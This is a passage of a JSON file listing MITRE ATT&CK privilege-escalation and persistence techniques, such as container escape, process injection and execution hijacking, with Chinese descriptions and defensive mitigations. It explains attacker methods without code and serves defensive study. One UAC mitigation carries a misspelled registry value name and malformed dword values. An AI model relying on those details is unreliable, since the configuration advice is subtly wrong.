                "id": "T1547.002",
                "name": "Authentication Package"
            },
            {
                "id": "T1547.003",
                "name": "Time Providers"
            },
            {
                "id": "T1547.004",
                "name": "Winlogon Helper DLL"
            },
            {
                "id": "T1547.005",
                "name": "Security Support Provider"
            },
            {
                "id": "T1547.006",
                "name": "Kernel Modules and Extensions"
            },
            {
                "id": "T1547.007",
                "name": "Re-opened Applications"
            },
            {
                "id": "T1547.008",
                "name": "LSASS Driver"
            },
            {
                "id": "T1547.009",
                "name": "Shortcut Modification"
            },
            {
                "id": "T1547.010",
                "name": "Port Monitors"
            },
            {
                "id": "T1547.012",
                "name": "Print Processors"
            },
            {
                "id": "T1547.013",
                "name": "XDG Autostart Entries"
            },
            {
                "id": "T1547.014",
                "name": "Active Setup"
            },
            {
                "id": "T1547.015",
                "name": "Login Items"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以将系统设置配置为在系统引导或登录期间自动执行程序，以保持持久性或在受损系统上获得更高级别的权限。操作系统可以具有用于在系统引导或帐户登录时自动运行程序的机制。这些机制可能包括自动执行程序，这些程序被放置在专门指定的目录中，或者被存储配置信息的存储库（如Windows注册表）引用。对手可以通过修改或扩展内核的特性来实现相同的目标。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "由于某些启动或登录自动启动程序以更高的权限运行，对手可能会利用这些权限提升权限。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1037",
        "name": "Boot or Logon Initialization Scripts",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [
            {
                "id": "T1037.001",
                "name": "Logon Script (Windows)"
            },
            {
                "id": "T1037.002",
                "name": "Login Hook"
            },
            {
                "id": "T1037.003",
                "name": "Network Logon Script"
            },
            {
                "id": "T1037.004",
                "name": "RC Scripts"
            },
            {
                "id": "T1037.005",
                "name": "Startup Items"
            }
        ],
        "version": "2.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以使用在启动或登录初始化时自动执行的脚本来建立持久性。初始化脚本可以用于执行管理功能，这些功能通常可以执行其他程序或将信息发送到内部日志服务器。这些脚本可以根据操作系统以及本地或远程应用而有所不同。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可以使用这些脚本在单个系统上保持持久性。根据登录脚本的访问配置，可能需要本地凭据或管理员帐户。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "由于某些启动或登录初始化脚本以更高的权限运行，因此对手也可以升级其权限。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将对登录脚本的写入权限限制为特定管理员。"
                        }
                    ]
                ]
            },
            {
                "id": "M1024",
                "name": "限制注册表权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保为注册表配置单元设置了适当的权限，以防止用户修改可能导致持久性的登录脚本的密钥。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1543",
        "name": "Create or Modify System Process",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [
            {
                "id": "T1543.001",
                "name": "Launch Agent"
            },
            {
                "id": "T1543.002",
                "name": "Systemd Service"
            },
            {
                "id": "T1543.003",
                "name": "Windows Service"
            },
            {
                "id": "T1543.004",
                "name": "Launch Daemon"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "作为持久性的一部分，敌人可以创建或修改系统级进程，以重复执行恶意有效载荷。当操作系统启动时，它们可以启动执行后台系统功能的进程。在Windows和Linux上，这些系统进程被称为服务。在macOS上，运行名为Launch Daemon和Launch Agent的launchd进程来完成系统初始化并加载用户特定的参数。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会安装新的服务、守护进程或代理，这些服务、守护程序或代理可以配置为在启动时或可重复的时间间隔执行，以建立持久性。类似地，对手可能会修改现有的服务、守护程序或代理以达到相同的效果。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "服务、守护程序或代理可以使用管理员权限创建，但可以使用root/SYSTEM权限执行。敌人可能会利用此功能创建或修改系统流程，以提升权限。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用能够检测企业内系统上的特权和服务滥用机会并加以纠正的审核工具。"
                        }
                    ]
                ]
            },
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在Windows 10上，启用减少攻击面（ASR）规则，以防止应用程序将签名的易受攻击的驱动程序写入系统。在Windows 10和11上，启用Microsoft漏洞驱动程序阻止列表，以帮助加强对第三方开发的驱动程序的攻击。"
                        }
                    ]
                ]
            },
            {
                "id": "M1045",
                "name": "代码签名",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在可能的情况下，只强制注册和执行合法签名的服务驱动程序。"
                        }
                    ]
                ]
            },
            {
                "id": "M1033",
                "name": "限制软件安装",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "仅将软件安装限制在受信任的存储库中，并小心孤立的软件包。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保已启用驱动程序签名强制以限制未签名的驱动程序的安装。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将对系统级进程文件的读/写访问权限限制为仅选择有合法需要管理系统服务的特权用户。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制用户帐户和组的权限，以便只有经过授权的管理员才能与系统级流程更改和服务配置进行交互。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1484",
        "name": "Domain Policy Modification",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [
            {
                "id": "T1484.001",
                "name": "Group Policy Modification"
            },
            {
                "id": "T1484.002",
                "name": "Domain Trust Modification"
            }
        ],
        "version": "2.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会修改域的配置设置，以逃避防御和/或提升域环境中的权限。域提供了一种集中的方式来管理计算机资源（例如：计算机、用户帐户）在网络上的行为和相互交互。域的策略还包括可以在多域/林环境中的域之间应用的配置设置。对域设置的修改可能包括更改域组策略对象（GPO）或更改域的信任设置，包括联合信任。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "有了足够的权限，对手可以修改域策略设置。由于域配置设置控制着Active Directory（AD）环境中的许多交互，因此这种滥用可能会引发大量潜在的攻击。这种滥用的例子包括修改GPO以将恶意的计划任务推送到整个域环境中的计算机，或者修改域信任以包括对手控制的域，在该域中，他们可以控制随后将被受害者域资源接受的访问令牌。敌人还可以更改AD环境中的配置设置，以实现流氓域控制器。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可能会临时修改域策略，执行恶意操作，然后恢复更改以删除可疑指标。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用审核工具，如BloodHound（1.5.1及更高版本），识别并纠正GPO权限滥用机会（例如：GPO修改权限）。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用最低权限并保护对域控制器和Active Directory联合身份验证服务（AD FS）服务器的管理访问。不要创建具有管理权限的服务帐户。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑实现WMI和安全筛选，以进一步定制GPO将应用于哪些用户和计算机。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1611",
        "name": "Escape to Host",
        "tactics": [
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会从容器中突围出来，以获得对底层主机的访问权限。这可以允许对手从主机级别或主机本身访问其他容器化资源。原则上，容器化资源应提供应用程序功能的清晰分离，并与主机环境隔离。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手有多种方式可以逃到宿主环境中。示例包括创建一个容器，该容器被配置为使用绑定参数装载主机的文件系统，这允许对手丢弃有效载荷并在主机上执行控制实用程序，如cron；利用特权容器在底层主机上运行命令或加载恶意内核模块；或者滥用系统调用，如"
                },
                {
                    "type": "code",
                    "content": "unshare"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "keyctl"
                },
                {
                    "type": "text",
                    "content": "来提升权限和窃取机密。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "此外，对手可能能够利用装有容器管理套接字的受损容器，如"
                },
                {
                    "type": "code",
                    "content": "docker.sock"
                },
                {
                    "type": "text",
                    "content": "，通过容器管理命令突破容器。敌人也可以通过特权升级利用来逃脱，例如利用全局符号链接中的漏洞来访问主机的根目录。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "获得对主机的访问权限可以为对手提供实现后续目标的机会，例如建立持久性、在环境中横向移动或在主机上建立指挥和控制信道。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1048",
                "name": "应用程序隔离和沙盒",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑使用seccomp、seccomp-bpf或限制某些系统调用（如装载）的类似解决方案。在Kubernetes环境中，考虑定义Pod安全标准，以限制容器对主机进程名称空间、主机网络和主机文件系统的访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "从容器中移除不必要的工具和软件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "尽可能使用只读容器、只读文件系统和最少的映像来阻止命令的运行。在可能的情况下，还可以考虑使用应用程序控制和软件限制工具（如SELinux提供的工具）来限制对容器中的文件、进程和系统调用的访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保容器默认情况下不以root身份运行，并且不使用不必要的权限或已安装的组件。在Kubernetes环境中，考虑定义Pod安全标准，以防止Pod运行特权容器。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1546",
        "name": "Event Triggered Execution",
        "tactics": [
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            }
        ],
        "subs": [
            {
                "id": "T1546.001",
                "name": "Change Default File Association"
            },
            {
                "id": "T1546.002",
                "name": "Screensaver"
            },
            {
                "id": "T1546.003",
                "name": "Windows Management Instrumentation Event Subscription"
            },
            {
                "id": "T1546.004",
                "name": "Unix Shell Configuration Modification"
            },
            {
                "id": "T1546.005",
                "name": "Trap"
            },
            {
                "id": "T1546.006",
                "name": "LC_LOAD_DYLIB Addition"
            },
            {
                "id": "T1546.007",
                "name": "Netsh Helper DLL"
            },
            {
                "id": "T1546.008",
                "name": "Accessibility Features"
            },
            {
                "id": "T1546.009",
                "name": "AppCert DLLs"
            },
            {
                "id": "T1546.010",
                "name": "AppInit DLLs"
            },
            {
                "id": "T1546.011",
                "name": "Application Shimming"
            },
            {
                "id": "T1546.012",
                "name": "Image File Execution Options Injection"
            },
            {
                "id": "T1546.013",
                "name": "PowerShell Profile"
            },
            {
                "id": "T1546.014",
                "name": "Emond"
            },
            {
                "id": "T1546.015",
                "name": "Component Object Model Hijacking"
            },
            {
                "id": "T1546.016",
                "name": "Installer Packages"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以使用基于特定事件触发执行的系统机制来建立持久性和/或提升特权。各种操作系统具有监视和订阅诸如登录之类的事件或诸如运行特定应用程序/二进制文件之类的其他用户活动的手段。云环境还可以支持各种功能和服务，这些功能和服务监视并可以响应于特定的云事件而被调用。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "攻击者可能会滥用这些机制，通过重复执行恶意代码来保持对受害者的持久访问。在获得对受害者系统的访问权限后，对手可以创建/修改事件触发器，以指向每当调用事件触发器时将执行的恶意内容。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "由于执行可以由具有更高权限的帐户代理，例如SYSTEM或服务帐户，因此对手可能能够滥用这些触发的执行机制来提升其权限。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1068",
        "name": "Exploitation for Privilege Escalation",
        "tactics": [
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [],
        "version": "1.5",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会利用软件漏洞来提升特权。当对手利用程序、服务或操作系统软件或内核本身中的编程错误来执行对手控制的代码时，就会发生软件漏洞的利用。权限级别等安全结构通常会阻碍对信息的访问和某些技术的使用，因此对手可能需要执行权限升级，包括使用软件来规避这些限制。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "当最初获得对系统的访问权限时，对手可能在较低特权的进程中操作，这将阻止他们访问系统上的某些资源。漏洞可能存在，通常存在于通常以更高权限运行的操作系统组件和软件中，可以利用这些漏洞获得更高级别的系统访问权限。这可能使某人能够根据易受攻击的组件从无特权或用户级别的权限移动到SYSTEM或root权限。这也可以使对手能够从虚拟化环境（如虚拟机或容器内）转移到底层主机上。这可能是对手危害已正确配置并限制其他权限提升方法的端点系统的必要步骤。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "攻击者可能会将签名的易受攻击的驱动程序带到受损的机器上，以便利用该漏洞在内核模式下执行代码。这个过程有时被称为自带易受攻击的驱动程序（BYOVD）。敌人可能包括在初始访问期间交付文件的易受攻击的驱动程序，或通过入口工具传输或横向工具传输将其下载到受损系统。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1048",
                "name": "应用程序隔离和沙盒",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过使用沙箱利用未发现或未修补的漏洞，使对手难以推进行动。其他类型的虚拟化和应用程序细分也可以减轻某些类型的利用带来的影响。这些系统中可能仍然存在其他漏洞和弱点的风险。"
                        }
                    ]
                ]
            },
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑阻止已知易受攻击的驱动程序的执行，对手可能会利用这些驱动程序在内核模式下执行代码。在审核模式下验证驱动程序块规则，以确保在生产部署之前的稳定性。"
                        }
                    ]
                ]
            },
            {
                "id": "M1050",
                "name": "利用漏洞保护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "查找利用漏洞期间使用的行为的安全应用程序，如Windows Defender Exploit Guard（WDEG）和增强型缓解体验工具包（EMET），可用于缓解某些利用行为。控制流完整性检查是另一种可能识别和阻止软件利用的方法。其中许多保护取决于体系结构和目标应用程序二进制文件的兼容性，可能不适用于以权限提升为目标的软件组件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1019",
                "name": "威胁情报计划",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "开发强大的网络威胁情报能力，以确定哪些类型和级别的威胁可能使用软件攻击，以及针对特定组织的0天。"
                        }
                    ]
                ]
            },
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过对内部企业端点和服务器使用补丁管理，定期更新软件。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1574",
        "name": "Hijack Execution Flow",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            },
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1574.001",
                "name": "DLL Search Order Hijacking"
            },
            {
                "id": "T1574.002",
                "name": "DLL Side-Loading"
            },
            {
                "id": "T1574.004",
                "name": "Dylib Hijacking"
            },
            {
                "id": "T1574.005",
                "name": "Executable Installer File Permissions Weakness"
            },
            {
                "id": "T1574.006",
                "name": "Dynamic Linker Hijacking"
            },
            {
                "id": "T1574.007",
                "name": "Path Interception by PATH Environment Variable"
            },
            {
                "id": "T1574.008",
                "name": "Path Interception by Search Order Hijacking"
            },
            {
                "id": "T1574.009",
                "name": "Path Interception by Unquoted Path"
            },
            {
                "id": "T1574.010",
                "name": "Services File Permissions Weakness"
            },
            {
                "id": "T1574.011",
                "name": "Services Registry Permissions Weakness"
            },
            {
                "id": "T1574.012",
                "name": "COR_PROFILER"
            },
            {
                "id": "T1574.013",
                "name": "KernelCallbackTable"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会通过劫持操作系统运行程序的方式来执行自己的恶意负载。劫持执行流可以用于持久性，因为这种被劫持的执行可能会随着时间的推移而再次发生。敌人也可能使用这些机制来提升特权或规避防御，例如应用程序控制或其他执行限制。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可以通过多种方式劫持执行流程，包括操纵操作系统如何定位要执行的程序。操作系统如何定位程序要使用的库也可以被截取。操作系统查找程序/资源的位置，如文件目录，以及在Windows的情况下的注册表，也可能被恶意负载毒害。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1013",
                "name": "应用程序开发人员指南",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果可能，请在清单文件中包含哈希值，以帮助防止恶意库的副加载。"
                        }
                    ]
                ]
            },
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用能够检测企业内系统劫持机会并加以纠正的审计工具。像PowerSploit框架这样的工具包包含PowerUp模块，这些模块可用于探索系统的劫持弱点。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "使用Windows附带的程序sxstrace.exe以及手动检查来检查清单文件中的软件侧加载漏洞。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "在程序配置文件、脚本、path环境变量、服务和快捷方式中，通过在函数允许的情况下用引号包围path变量，查找并消除路径拦截弱点。请注意Windows执行或加载二进制文件时使用的搜索顺序，并在适当的情况下使用完全限定的路径。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "卸载软件时，请清理旧的Windows注册表项，以避免没有关联的合法二进制文件的注册表项。定期搜索、纠正或报告系统上的路径拦截弱点，这些弱点可能是使用自定义或可用工具引入的，这些工具报告使用不安全路径配置的软件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "一些端点安全解决方案可以配置为基于常见的指示符序列（例如：特定API函数的执行）来阻止与进程注入/内存篡改相关的某些类型的行为。"
                        }
                    ]
                ]
            },
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "敌人可能会使用新的有效载荷来执行这项技术。通过使用同样能够阻止合法软件加载的库的应用程序控制解决方案，识别并阻止通过劫持执行的潜在恶意软件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在写保护位置安装软件。在运行应用程序的文件夹和标准库文件夹中，设置目录访问控制以防止文件写入应用程序的搜索路径。"
                        }
                    ]
                ]
            },
            {
                "id": "M1044",
                "name": "限制库加载",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "不允许加载远程DLL。默认情况下，它包含在Windows Server 2012+中，并可通过XP+和Server 2003+的修补程序获得。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "启用安全DLL搜索模式，强制搜索具有更大限制的目录（例如"
                        },
                        {
                            "type": "code",
                            "content": "%SYSTEMROOT%"
                        },
                        {
                            "type": "text",
                            "content": "）中的系统DLL，以便在本地目录DLL（例如用户的主目录）之前使用"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "安全DLL搜索模式可以通过组策略在“计算机配置”>“[策略]”>“管理模板”>“MSS（旧版）:MSS:（SafeDllSearchMode）Enable Safe DLL Search Mode”中启用。相关的Windows注册表项位于"
                        },
                        {
                            "type": "code",
                            "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode"
                        },
                        {
                            "type": "text",
                            "content": ""
                        }
                    ]
                ]
            },
            {
                "id": "M1024",
                "name": "限制注册表权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保为注册表配置单元设置了适当的权限，以防止用户修改可能导致权限提升的系统组件的密钥。"
                        }
                    ]
                ]
            },
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期更新软件，以包括修复DLL端加载漏洞的修补程序。"
                        }
                    ]
                ]
            },
            {
                "id": "M1052",
                "name": "用户帐户控制",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "关闭标准用户的UAC权限提升"
                        },
                        {
                            "type": "code",
                            "content": "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]"
                        },
                        {
                            "type": "text",
                            "content": "以自动拒绝提升请求，添加："
                        },
                        {
                            "type": "code",
                            "content": "“ConsentCompBehaviorUser”=dword:000000000"
                        },
                        {
                            "type": "text",
                            "content": "。考虑通过添加以下内容为所有用户启用安装程序检测："
                        },
                        {
                            "type": "code",
                            "content": "“EnableInstallerDetection”=dword:000000001"
                        },
                        {
                            "type": "text",
                            "content": "。这将提示输入安装密码，并记录尝试。要禁用安装程序检测，请添加："
                        },
                        {
                            "type": "code",
                            "content": "“EnableInstallerDetection”=dword:000000000"
                        },
                        {
                            "type": "text",
                            "content": "。这可能会防止在UAC检测安装程序的过程中利用漏洞提升权限，但会允许安装过程在不被记录的情况下继续进行。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制用户帐户和组的权限，以便只有经过授权的管理员才能与服务更改和服务二进制目标路径位置进行交互。在可能的情况下，拒绝从用户目录（如文件下载目录和临时目录）执行。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "确保设置了适当的权限和目录访问控制，以拒绝用户将文件写入顶级目录"
                        },
                        {
                            "type": "code",
                            "content": "C:"
                        },
                        {
                            "type": "text",
                            "content": "和系统目录（如"
                        },
                        {
                            "type": "code",
                            "content": "C:\\Windows\\"
                        },
                        {
                            "type": "text",
                            "content": "），从而减少恶意文件可能被放置执行的位置。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1055",
        "name": "Process Injection",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [
            {
                "id": "T1055.001",
                "name": "Dynamic-link Library Injection"
            },
            {
                "id": "T1055.002",
                "name": "Portable Executable Injection"
            },
            {
                "id": "T1055.003",
                "name": "Thread Execution Hijacking"
            },
            {
                "id": "T1055.004",
                "name": "Asynchronous Procedure Call"
            },
            {
                "id": "T1055.005",
                "name": "Thread Local Storage"
            },
            {
                "id": "T1055.008",
                "name": "Ptrace System Calls"
            },
            {
                "id": "T1055.009",
                "name": "Proc Memory"
            },
            {
                "id": "T1055.011",
                "name": "Extra Window Memory Injection"
            },
            {
                "id": "T1055.012",
                "name": "Process Hollowing"
            },
            {
                "id": "T1055.013",
                "name": "Process Doppelgänging"
            },
            {
                "id": "T1055.014",
                "name": "VDSO Hijacking"
            },
            {
                "id": "T1055.015",
                "name": "ListPlanting"
            }
        ],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会将代码注入进程，以逃避基于进程的防御，并可能提升特权。进程注入是一种在单独的活动进程的地址空间中执行任意代码的方法。在另一个进程的上下文中运行代码可以允许访问该进程的内存、系统/网络资源，以及可能提升的权限。通过进程注入执行也可能逃避安全产品的检测，因为在合法进程下执行是被掩盖的。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "有许多不同的方法可以将代码注入进程，其中许多方法滥用合法功能。这些实现适用于每个主要的操作系统，但通常是特定于平台的。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "更复杂的样本可以利用命名管道或其他进程间通信（IPC）机制作为通信信道，执行多个进程注入以分割模块并进一步逃避检测。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "一些端点安全解决方案可以配置为基于注入过程中发生的常见行为序列来阻止某些类型的过程注入。例如，在Windows 10上，减少攻击面（ASR）规则可能会阻止Office应用程序进行代码注入。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "利用Yama（例如：/proc/sys/kernel/Yama/ptrace_scope），通过仅将ptrace的使用限制为特权用户，来减轻基于ptrace进程的注入。其他缓解控制包括部署提供高级访问控制和进程限制的安全内核模块，如SELinux、grsecurity和AppArmor。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1053",
        "name": "Scheduled Task/Job",
        "tactics": [
            {
                "id": "TA0002",
                "name": "Execution"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [
            {
                "id": "T1053.002",
                "name": "At"
            },
            {
                "id": "T1053.003",
                "name": "Cron"
            },
            {
                "id": "T1053.005",
                "name": "Scheduled Task"
            },
            {
                "id": "T1053.006",
                "name": "Systemd Timers"
            },
            {
                "id": "T1053.007",
                "name": "Container Orchestration Job"
            }
        ],
        "version": "2.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能滥用任务调度功能来促进恶意代码的初始或重复执行。所有主要操作系统中都存在实用程序，用于安排程序或脚本在指定的日期和时间执行。如果满足正确的身份验证（例如：Windows环境中的RPC以及文件和打印机共享），也可以在远程系统上调度任务。在远程系统上调度任务通常可能需要成为远程系统上的管理员或其他特权组的成员。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可以在系统启动时使用任务调度来执行程序，或者在计划的基础上执行程序以实现持久性。这些机制也可能被滥用以在指定帐户（例如具有提升权限/特权的帐户）的上下文下运行进程。与系统二进制代理执行类似，对手也滥用任务调度来潜在地掩盖可信系统进程下的一次性执行。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "PowerSploit框架等工具包包含PowerUp模块，这些模块可用于探索系统中可用于提升权限的计划任务中的权限弱点。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "配置计划任务的设置，以强制任务在经过身份验证的帐户的上下文下运行，而不允许它们作为SYSTEM运行。相关的注册表项位于"
                        },
                        {
                            "type": "code",
                            "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl"
                        },
                        {
                            "type": "text",
                            "content": "。可以通过GPO:计算机配置>[策略]>Windows设置>安全设置>本地策略>安全选项来配置该设置：域控制器：允许服务器操作员计划任务，设置为禁用。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将“增加计划优先级”选项配置为仅允许管理员组具有计划优先级进程的权限。这可以通过GPO:计算机配置>[策略]>Windows设置>安全设置>本地策略>用户权限分配进行配置：增加计划优先级。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制用户帐户的权限并修正权限提升向量，以便只有经过授权的管理员才能在远程系统上创建计划任务。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1078",
        "name": "Valid Accounts",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            },
            {
                "id": "TA0001",
                "name": "Initial Access"
            }
        ],
        "subs": [
            {
                "id": "T1078.001",
                "name": "Default Accounts"
            },
            {
                "id": "T1078.002",
                "name": "Domain Accounts"
            },
            {
                "id": "T1078.003",
                "name": "Local Accounts"
            },
            {
                "id": "T1078.004",
                "name": "Cloud Accounts"
            }
        ],
        "version": "2.6",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会获取并滥用现有帐户的凭据，以此作为获得初始访问、持久性、特权提升或防御规避的手段。泄露的凭证可用于绕过网络内系统上各种资源上的访问控制，甚至可用于持久访问远程系统和外部可用服务，如VPN、Outlook Web access、网络设备和远程桌面。泄露的证书还可以向对手授予对特定系统的增加的特权或对网络的受限区域的访问。敌人可能会选择不将恶意软件或工具与这些凭据提供的合法访问结合使用，从而更难检测到它们的存在。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在某些情况下，对手可能会滥用非活动帐户：例如，那些属于不再是组织成员的个人的帐户。使用这些帐户可能会使对手逃避检测，因为原始帐户用户将不会在场以识别其帐户上发生的任何异常活动。"
                }
            ],
            [
                {
